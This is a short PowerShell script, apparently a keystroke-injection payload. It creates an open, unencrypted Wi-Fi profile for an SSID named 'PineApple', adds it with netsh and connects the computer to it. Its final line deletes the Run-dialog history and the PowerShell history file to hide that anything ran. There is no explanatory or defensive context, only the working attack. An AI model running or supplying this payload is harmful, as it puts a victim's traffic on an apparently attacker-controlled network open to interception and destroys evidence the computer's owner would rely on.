$profilefile="Home.xml"
$SSID="PineApple"
$SSIDHEX=($SSID.ToCharArray() |foreach-object {'{0:X}' -f ([int]$_)}) -join''
$xmlfile="<?xml version=""1.0""?>
<WLANProfile xmlns=""http://www.microsoft.com/networking/WLAN/profile/v1"">
<name>$SSID</name>
<SSIDConfig>
<SSID>
<hex>$SSIDHEX</hex>
<name>$SSID</name>
</SSID>
</SSIDConfig>
<connectionType>ESS</connectionType>
<connectionMode>manual</connectionMode>
<MSM>
<security>
<authEncryption>
<authentication>open</authentication>
<encryption>none</encryption>
<useOneX>false</useOneX>
</authEncryption>
</security>
</MSM>
</WLANProfile>
"
$XMLFILE > ($profilefile)
netsh wlan add profile filename="$($profilefile)"
netsh wlan connect name=$SSID
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f; Remove-Item (Get-PSreadlineOption).HistorySavePath
